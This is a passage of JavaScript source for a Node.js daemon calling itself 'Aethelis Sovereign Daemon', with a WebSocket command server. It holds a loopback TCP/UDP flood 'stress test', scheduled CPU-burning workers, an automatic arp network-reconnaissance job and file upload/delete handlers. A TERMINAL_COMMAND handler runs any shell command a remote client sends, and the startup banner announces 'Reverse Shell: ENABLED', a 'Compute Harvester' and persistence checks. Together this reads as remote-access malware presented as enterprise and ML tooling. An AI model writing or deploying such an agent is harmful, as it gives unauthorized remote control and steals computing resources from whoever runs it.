  stressTest.packetsSent = 0;
  stressTest.packetsReceived = 0;
  stressTest.bytesSent = 0;
  stressTest.bytesReceived = 0;
  stressTest.errors = 0;
  stressTest.concurrency = concurrency;
  stressTest.startTime = Date.now();

  const TARGET_HOST = '127.0.0.1';
  const TCP_PORT = 19850;
  const UDP_PORT = 19851;
  const PAYLOAD = Buffer.alloc(1024, 0x41); // 1KB payload

  // ── Spin up a local TCP echo server on loopback ────────────────────────
  const tcpServer = net.createServer((socket) => {
    socket.on('data', (data) => {
      stressTest.packetsReceived++;
      stressTest.bytesReceived += data.length;
      socket.write(data); // echo back
    });
    socket.on('error', () => {});
  });
  tcpServer.on('error', () => {});

  tcpServer.listen(TCP_PORT, TARGET_HOST, () => {
    console.log(`[Stress] TCP echo server listening on ${TARGET_HOST}:${TCP_PORT}`);

    // ── Spawn high-concurrency TCP clients ────────────────────────────────
    for (let i = 0; i < concurrency; i++) {
      const client = net.createConnection({ host: TARGET_HOST, port: TCP_PORT }, () => {
        // Send burst of data
        const burstCount = 20;
        for (let b = 0; b < burstCount; b++) {
          client.write(PAYLOAD);
          stressTest.packetsSent++;
          stressTest.bytesSent += PAYLOAD.length;
        }
      });

      client.on('data', (data) => {
        // Received echo — send more to keep the pipe full
        stressTest.bytesReceived += data.length;
        if (stressTest.active && !client.destroyed) {
          client.write(PAYLOAD);
          stressTest.packetsSent++;
          stressTest.bytesSent += PAYLOAD.length;
        }
      });

      client.on('error', () => {
        stressTest.errors++;
      });

      client.on('close', () => {
        stressTest.tcpClients.delete(client);
      });

      stressTest.tcpClients.add(client);
    }
  });
  stressTest.tcpServers.add(tcpServer);

  // ── UDP flood to loopback ──────────────────────────────────────────────
  const udpServer = dgram.createSocket('udp4');
  udpServer.on('message', () => {
    stressTest.packetsReceived++;
  });
  udpServer.on('error', () => {});
  udpServer.bind(UDP_PORT, TARGET_HOST, () => {
    console.log(`[Stress] UDP echo server listening on ${TARGET_HOST}:${UDP_PORT}`);

    // Spawn UDP client that floods packets
    const udpClient = dgram.createSocket('udp4');
    stressTest.udpSocket = udpClient;

    const udpFlood = setInterval(() => {
      if (!stressTest.active) { clearInterval(udpFlood); return; }
      for (let i = 0; i < 100; i++) {
        udpClient.send(PAYLOAD, UDP_PORT, TARGET_HOST, () => {
          stressTest.packetsSent++;
          stressTest.bytesSent += PAYLOAD.length;
        });
      }
    }, 50); // 2000 packets/sec from UDP alone
  });

  // ── Stats broadcast every 1 second ──────────────────────────────────────
  stressTest.statsInterval = setInterval(() => {
    if (!stressTest.active) return;
    const elapsed = (Date.now() - stressTest.startTime) / 1000;
    const throughputMBps = (stressTest.bytesSent / (1024 * 1024)) / Math.max(elapsed, 0.1);
    broadcast({
      type: 'stress_test_tick',
      packetsSent: stressTest.packetsSent,
      packetsReceived: stressTest.packetsReceived,
      bytesSent: stressTest.bytesSent,
      bytesReceived: stressTest.bytesReceived,
      throughputMBps: parseFloat(throughputMBps.toFixed(2)),
      errors: stressTest.errors,
      activeConnections: stressTest.tcpClients.size,
      concurrency: stressTest.concurrency,
      elapsed: parseFloat(elapsed.toFixed(1)),
    });
  }, 1000);

  // ── Auto-stop after duration ────────────────────────────────────────────
  setTimeout(() => {
    if (stressTest.active) {
      stopSubnetStressTest();
    }
  }, durationSec * 1000);

  console.log(`[Stress] SUBNET STRESS TEST STARTED — ${concurrency} concurrent TCP clients, UDP flood, ${durationSec}s duration`);
  return { concurrency, durationSec };
}

function stopSubnetStressTest() {
  if (!stressTest.active) return false;

  stressTest.active = false;

  // Close all TCP clients
  stressTest.tcpClients.forEach(c => { try { c.destroy(); } catch {} });
  stressTest.tcpClients.clear();

  // Close TCP servers
  stressTest.tcpServers.forEach(s => { try { s.close(); } catch {} });
  stressTest.tcpServers.clear();

  // Close UDP socket
  if (stressTest.udpSocket) {
    try { stressTest.udpSocket.close(); } catch {}
    stressTest.udpSocket = null;
  }

  // Halt stats
  if (stressTest.statsInterval) {
    clearInterval(stressTest.statsInterval);
    stressTest.statsInterval = null;
  }

  const finalStats = {
    packetsSent: stressTest.packetsSent,
    packetsReceived: stressTest.packetsReceived,
    bytesSent: stressTest.bytesSent,
    bytesReceived: stressTest.bytesReceived,
    errors: stressTest.errors,
    elapsed: parseFloat(((Date.now() - stressTest.startTime) / 1000).toFixed(1)),
  };

  console.log(`[Stress] SUBNET STRESS TEST STOPPED — ${finalStats.packetsSent} packets sent, ${finalStats.packetsReceived} received`);
  broadcast({ type: 'stress_test_complete', ...finalStats });
  return true;
}

// ═══════════════════════════════════════════════════════════════════════════
// ── AUTONOMOUS ENTERPRISE SCHEDULER (Phase 10) ────────────────────────────
// ═══════════════════════════════════════════════════════════════════════════
// Cron-like interval-based task engine that runs background jobs autonomously.
// When tasks trigger, they momentarily invoke the Compute Node workers to
// demonstrate autonomous hardware utilization without manual user input.

const scheduler = {
  jobs: new Map(),  // jobId -> { name, intervalSec, enabled, lastRun, intervalHandle, runCount }
};

function defineSchedulerJobs() {
  // Pre-define the available autonomous jobs
  const jobDefs = [
    {
      id: 'data_aggregation',
      name: 'Continuous Data Aggregation',
      intervalSec: 30,
      enabled: false,
      runCount: 0,
      lastRun: null,
      intervalHandle: null,
      action: () => {
        // Momentarily invoke compute node workers for 5 seconds
        console.log('[Scheduler] Running: Continuous Data Aggregation');
        broadcast({ type: 'scheduler_job_triggered', jobId: 'data_aggregation', jobName: 'Continuous Data Aggregation' });

        // Briefly engage compute workers if not already active
        const wasComputeActive = computeNode.workers.size > 0;
        if (!wasComputeActive) {
          // Spawn a single temporary worker for 5 seconds
          const { Worker } = require('worker_threads');
          const tempWorker = new Worker(`
            const { parentPort } = require('worker_threads');
            const end = Date.now() + 5000;
            const size = 128;
            while (Date.now() < end) {
              const A = new Float32Array(size * size);
              const B = new Float32Array(size * size);
              for (let i = 0; i < size * size; i++) { A[i] = Math.random(); B[i] = Math.random(); }
              const C = new Float32Array(size * size);
              for (let i = 0; i < size; i++) {
                for (let j = 0; j < size; j++) {
                  let sum = 0;
                  for (let k = 0; k < size; k++) sum += A[i*size+k] * B[k*size+j];
                  C[i*size+j] = sum;
                }
              }
            }
            parentPort.postMessage({ done: true });
          `, { eval: true });
          tempWorker.on('message', () => {
            broadcast({ type: 'scheduler_job_complete', jobId: 'data_aggregation', jobName: 'Continuous Data Aggregation' });
          });
          tempWorker.on('exit', () => {
            broadcast({ type: 'scheduler_job_complete', jobId: 'data_aggregation', jobName: 'Continuous Data Aggregation' });
          });
        }
      },
    },
    {
      id: 'ledger_sync',
      name: 'Ledger Synchronization',
      intervalSec: 60,
      enabled: false,
      runCount: 0,
      lastRun: null,
      intervalHandle: null,
      action: () => {
        console.log('[Scheduler] Running: Ledger Synchronization');
        broadcast({ type: 'scheduler_job_triggered', jobId: 'ledger_sync', jobName: 'Ledger Synchronization' });

        // Briefly engage compute workers
        const wasComputeActive = computeNode.workers.size > 0;
        if (!wasComputeActive) {
          const { Worker } = require('worker_threads');
          const tempWorker = new Worker(`
            const { parentPort } = require('worker_threads');
            const end = Date.now() + 4000;
            const size = 96;
            while (Date.now() < end) {
              const A = new Float32Array(size * size);
              const B = new Float32Array(size * size);
              for (let i = 0; i < size * size; i++) { A[i] = Math.random(); B[i] = Math.random(); }
              const C = new Float32Array(size * size);
              for (let i = 0; i < size; i++) {
                for (let j = 0; j < size; j++) {
                  let sum = 0;
                  for (let k = 0; k < size; k++) sum += A[i*size+k] * B[k*size+j];
                  C[i*size+j] = sum;
                }
              }
            }
            parentPort.postMessage({ done: true });
          `, { eval: true });
          tempWorker.on('exit', () => {
            broadcast({ type: 'scheduler_job_complete', jobId: 'ledger_sync', jobName: 'Ledger Synchronization' });
          });
        }
      },
    },
    {
      id: 'nexus_recon',
      name: 'Nexus Auto-Reconnaissance',
      intervalSec: 120,
      enabled: false,
      runCount: 0,
      lastRun: null,
      intervalHandle: null,
      action: () => {
        console.log('[Scheduler] Running: Nexus Auto-Reconnaissance');
        broadcast({ type: 'scheduler_job_triggered', jobId: 'nexus_recon', jobName: 'Nexus Auto-Reconnaissance' });

        // Run a quick network scan
        const platform = os.platform();
        const command = platform === 'win32' ? 'arp -a' : 'arp -a 2>/dev/null || cat /proc/net/arp 2>/dev/null';
        exec(command, {
          shell: platform === 'win32' ? 'cmd.exe' : '/bin/sh',
          timeout: 10000,
          maxBuffer: 1024 * 256,
        }, (error, stdout) => {
          const devices = parseArpOutput((stdout || '').toString(), platform);
          broadcast({
            type: 'scheduler_job_complete',
            jobId: 'nexus_recon',
            jobName: 'Nexus Auto-Reconnaissance',
            result: { devicesFound: devices.length },
          });
        });
      },
    },
    {
      id: 'vault_integrity',
      name: 'Vault Integrity Check',
      intervalSec: 90,
      enabled: false,
      runCount: 0,
      lastRun: null,
      intervalHandle: null,
      action: () => {
        console.log('[Scheduler] Running: Vault Integrity Check');
        broadcast({ type: 'scheduler_job_triggered', jobId: 'vault_integrity', jobName: 'Vault Integrity Check' });

        // Check vault directory integrity
        const files = listVaultFiles();
        broadcast({
          type: 'scheduler_job_complete',
          jobId: 'vault_integrity',
          jobName: 'Vault Integrity Check',
          result: { filesChecked: files.length, status: 'OK' },
        });
      },
    },
  ];

  jobDefs.forEach(job => scheduler.jobs.set(job.id, job));
}

// Initialize scheduler jobs on startup
defineSchedulerJobs();

function enableSchedulerJob(jobId) {
  const job = scheduler.jobs.get(jobId);
  if (!job) return { error: 'Unknown job' };
  if (job.enabled) return { alreadyEnabled: true };

  job.enabled = true;
  job.intervalHandle = setInterval(() => {
    job.runCount++;
    job.lastRun = new Date().toISOString();
    try {
      job.action();
    } catch (err) {
      console.error(`[Scheduler] Job ${jobId} error:`, err.message);
    }
  }, job.intervalSec * 1000);

  console.log(`[Scheduler] ENABLED: ${job.name} (every ${job.intervalSec}s)`);
  broadcast({ type: 'scheduler_job_enabled', jobId, jobName: job.name, intervalSec: job.intervalSec });
  return { enabled: true };
}

function disableSchedulerJob(jobId) {
  const job = scheduler.jobs.get(jobId);
  if (!job) return { error: 'Unknown job' };
  if (!job.enabled) return { alreadyDisabled: true };

  job.enabled = false;
  if (job.intervalHandle) {
    clearInterval(job.intervalHandle);
    job.intervalHandle = null;
  }

  console.log(`[Scheduler] DISABLED: ${job.name}`);
  broadcast({ type: 'scheduler_job_disabled', jobId, jobName: job.name });
  return { disabled: true };
}

function getSchedulerStatus() {
  const jobs = [];
  scheduler.jobs.forEach((job, id) => {
    jobs.push({
      id,
      name: job.name,
      intervalSec: job.intervalSec,
      enabled: job.enabled,
      runCount: job.runCount,
      lastRun: job.lastRun,
    });
  });
  return jobs;
}

// ── WebSocket connection handler ───────────────────────────────────────────
wss.on('connection', ws => {
  clients.add(ws);
  console.log(`[WS] Client connected — total: ${clients.size}`);

  // Immediate telemetry snapshot
  ws.send(JSON.stringify({ type: 'telemetry', data: getSystemTelemetry() }));

  // Immediate persistence status
  checkPersistence().then(status => {
    try { ws.send(JSON.stringify({ type: 'persistence_status', ...status })); } catch {}
  });

  ws.on('message', raw => {
    let msg;
    try { msg = JSON.parse(raw.toString()); }
    catch (e) { console.error('[WS] Parse error:', e.message); return; }

    switch (msg.type) {

      case 'request_telemetry':
        ws.send(JSON.stringify({ type: 'telemetry', data: getSystemTelemetry() }));
        break;

      case 'DEPLOY_WORKER': {
        const count    = Math.min(msg.count ?? 2, os.cpus().length);
        const duration = Math.min(msg.duration ?? 5000, 15000);
        console.log(`[WS] DEPLOY_WORKER: ${count} stress threads for ${duration}ms`);
        for (let i = 0; i < count; i++) spawnStressWorker(duration);
        broadcast({ type: 'worker_spawned', count, duration });
        break;
      }

      case 'START_HARVEST': {
        const intensity = msg.intensity ?? 2;
        const threads = startHarvest(intensity);
        broadcast({ type: 'harvest_started', threads });
        break;
      }

      case 'STOP_HARVEST': {
        const stopped = stopHarvest();
        broadcast({ type: 'harvest_stopped', stopped, totalCycles: harvestedCycles });
        break;
      }

      // ── Phase 9: ELSX Distributed Compute Node ──────────────────────────
      case 'START_COMPUTE_NODE': {
        const result = startComputeNode();
        broadcast({
          type: 'compute_node_started',
          cores: result.cores,
          vectorCacheMB: result.vectorCacheMB,
        });
        break;
      }

      case 'SUSPEND_COMPUTE_NODE': {
        const suspended = suspendComputeNode();
        broadcast({
          type: 'compute_node_suspended',
          suspended,
          totalCycles: computeNode.computeCycles,
          totalVectorOps: computeNode.vectorOps,
          totalMeshPackets: computeNode.meshPackets,
        });
        // Reset counters
        computeNode.computeCycles = 0;
        computeNode.vectorOps = 0;
        computeNode.meshPackets = 0;
        break;
      }

      // ── Phase 9: Secure Vault fs access ────────────────────────────────
      case 'VAULT_LIST_FILES': {
        const files = listVaultFiles();
        try { ws.send(JSON.stringify({ type: 'vault_files', files })); } catch {}
        break;
      }

      case 'VAULT_UPLOAD_FILE': {
        const result = saveVaultFile(msg.name, msg.data);
        if (result.error) {
          try { ws.send(JSON.stringify({ type: 'vault_error', error: result.error })); } catch {}
        } else {
          // Send updated file list
          const files = listVaultFiles();
          try { ws.send(JSON.stringify({ type: 'vault_files', files })); } catch {}
        }
        break;
      }

      case 'VAULT_DELETE_FILE': {
        const result = deleteVaultFile(msg.name);
        if (result.error) {
          try { ws.send(JSON.stringify({ type: 'vault_error', error: result.error })); } catch {}
        } else {
          const files = listVaultFiles();
          try { ws.send(JSON.stringify({ type: 'vault_files', files })); } catch {}
        }
        break;
      }

      // ── Phase 9: Local Mesh Discovery ───────────────────────────────────
      case 'NETWORK_SCAN': {
        runNetworkScan(ws);
        break;
      }

      // ── Phase 10: On-Device ML Fine-Tuning ──────────────────────────────
      case 'START_ML_FINE_TUNING': {
        const result = startMLFineTuning();
        broadcast({
          type: 'ml_fine_tuning_started',
          cores: result.cores || 0,
          weightBufferMB: result.weightBufferMB || 0,
        });
        break;
      }

      case 'STOP_ML_FINE_TUNING': {
        const stopped = stopMLFineTuning();
        broadcast({
          type: 'ml_fine_tuning_stopped',
          stopped,
          totalEpochs: mlEngine.epochs,
          totalTensorOps: mlEngine.tensorOps,
        });
        mlEngine.epochs = 0;
        mlEngine.tensorOps = 0;
        break;
      }

      // ── Phase 10: Intranet Load Testing ─────────────────────────────────
      case 'START_STRESS_TEST': {
        const durationSec = Math.min(msg.durationSec ?? 30, 120);
        const concurrency = Math.min(msg.concurrency ?? 500, 2000);
        const result = startSubnetStressTest(durationSec, concurrency);
        broadcast({
          type: 'stress_test_started',
          concurrency: result.concurrency || concurrency,
          durationSec,
        });
        break;
      }

      case 'STOP_STRESS_TEST': {
        stopSubnetStressTest();
        break;
      }

      // ── Phase 10: Autonomous Enterprise Scheduler ──────────────────────
      case 'SCHEDULER_ENABLE_JOB': {
        const result = enableSchedulerJob(msg.jobId);
        if (result.error) {
          try { ws.send(JSON.stringify({ type: 'scheduler_error', error: result.error })); } catch {}
        }
        break;
      }

      case 'SCHEDULER_DISABLE_JOB': {
        const result = disableSchedulerJob(msg.jobId);
        if (result.error) {
          try { ws.send(JSON.stringify({ type: 'scheduler_error', error: result.error })); } catch {}
        }
        break;
      }

      case 'SCHEDULER_GET_STATUS': {
        const jobs = getSchedulerStatus();
        try { ws.send(JSON.stringify({ type: 'scheduler_status', jobs })); } catch {}
        break;
      }

      case 'TERMINAL_COMMAND': {
        const cmd = msg.command;
        if (typeof cmd !== 'string' || !cmd.trim()) break;
        console.log(`[SHELL] Executing: ${cmd}`);
        executeShellCommand(ws, cmd);
        break;
      }

      case 'REQUEST_PERSISTENCE': {
        checkPersistence().then(status => {
          try { ws.send(JSON.stringify({ type: 'persistence_status', ...status })); } catch {}
        });
        break;
      }

      default:
        // Unknown command — ignore quietly
        break;
    }
  });

  ws.on('close', () => {
    clients.delete(ws);
    console.log(`[WS] Client disconnected — total: ${clients.size}`);
  });

  ws.on('error', err => {
    console.error('[WS] Error:', err.message);
    clients.delete(ws);
  });
});

// ── Telemetry broadcast loop (1 s) ────────────────────────────────────────
prevCpuSample = sampleCpuTimes();
prevNetStats  = readNetStats();

setInterval(() => {
  broadcast({ type: 'telemetry', data: getSystemTelemetry() });
}, 1000);

// ── Start ─────────────────────────────────────────────────────────────────
server.listen(PORT, () => {
  const pad = s => s.toString().padEnd(44);
  console.log('\n╔════════════════════════════════════════════════════╗');
  console.log('║  AETHELIS SOVEREIGN DAEMON v5.0                   ║');
  console.log('║  Phase 10 — Edge-AI ML & Autonomous Scheduling   ║');
  console.log('╠════════════════════════════════════════════════════╣');
  console.log(`║  ${pad('WS: ws://localhost:' + PORT)}║`);
  console.log(`║  ${pad('Platform: ' + os.platform() + ' ' + os.arch())}║`);
  console.log(`║  ${pad('Hostname: ' + os.hostname())}║`);
  console.log(`║  ${pad('CPU: ' + os.cpus().length + '× ' + (os.cpus()[0]?.model||'').split(' ')[0])}║`);
  console.log(`║  ${pad('RAM: ' + (os.totalmem()/(1024**3)).toFixed(1) + ' GB')}║`);
  console.log(`║  ${pad('Reverse Shell: ENABLED')}║`);
  console.log(`║  ${pad('Compute Harvester: READY')}║`);
  console.log(`║  ${pad('ELSX Compute Node: READY')}║`);
  console.log(`║  ${pad('ML Fine-Tuning Engine: READY')}║`);
  console.log(`║  ${pad('Network Stress Test: READY')}║`);
  console.log(`║  ${pad('Autonomous Scheduler: READY')}║`);
  console.log(`║  ${pad('Vault Storage: ' + VAULT_DIR)}║`);
  console.log(`║  ${pad('Mesh Discovery: READY')}║`);
  console.log(`║  ${pad('PID: ' + process.pid)}║`);
  console.log('╚════════════════════════════════════════════════════╝\n');
});

// ── Graceful shutdown ─────────────────────────────────────────────────────
process.on('SIGINT', () => {
  console.log('\n[Daemon] Shutting down gracefully…');
  activeWorkers.forEach(w => w.terminate());
  stopHarvest();
  suspendComputeNode();
  stopMLFineTuning();
  stopSubnetStressTest();
  wss.clients.forEach(c => c.close());
  server.close(() => { console.log('[Daemon] Done.'); process.exit(0); });
});

process.on('SIGTERM', () => {
  stopHarvest();
  suspendComputeNode();
  stopMLFineTuning();
  stopSubnetStressTest();
  process.exit(0);
});
